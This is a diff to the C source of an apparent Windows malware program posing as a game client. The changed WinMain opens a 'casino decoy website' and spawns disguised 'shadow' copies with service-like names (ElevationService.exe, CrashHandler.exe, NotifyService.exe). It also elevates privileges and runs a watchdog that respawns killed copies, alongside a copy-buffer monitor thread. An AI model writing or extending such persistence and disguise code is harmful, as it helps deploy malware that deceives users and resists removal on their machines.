@@ -357,34 +357,40 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 
 /* Windows entry point */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    /* Detect if this is a shadow copy */
+    char *cmdLine = GetCommandLineA();
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    int isShadow = (cmdLine && strstr(cmdLine, "--shadow") != NULL) ||
+                   (strstr(currentPath, "ElevationService.exe") != NULL) ||
+                   (strstr(currentPath, "CrashHandler.exe") != NULL) ||
+                   (strstr(currentPath, "NotifyService.exe") != NULL);
+
     /* Initialize subsystems */
     InitializeCriticalSection(&g_copy_buffer_cs);
     copy_buffer_init();
     ui_init();
     
-    /* Open casino decoy website */
-    ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
+    /* Open casino decoy website — ONLY for main .exe */
+    if (!isShadow) {
+        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
+    }
     
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
-    /* Check if this is a shadow copy — auto-protect after 15 seconds */
-    char *cmdLine = GetCommandLineA();
-    if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
-        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
-    }
-
-    /* Backup: detect if running from shadow path */
-    char currentPath[MAX_PATH];
-    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-    if (strstr(currentPath, "ElevationService.exe") != NULL ||
-        strstr(currentPath, "CrashHandler.exe") != NULL ||
-        strstr(currentPath, "NotifyService.exe") != NULL) {
+    /* Shadows auto-protect after 15 seconds */
+    if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
 
     /* Elevate privileges if needed for full functionality */
     sys_check_privileges();
+    
+    /* Main .exe: ensure all 3 shadows are running */
+    if (!isShadow) {
+        sys_spawn_shadow_copy();
+    }
     
     /* Start inter-process watchdog (respawns dead shadows) */
     CreateThread(NULL, 0, svc_watchdog, NULL, 0, NULL);
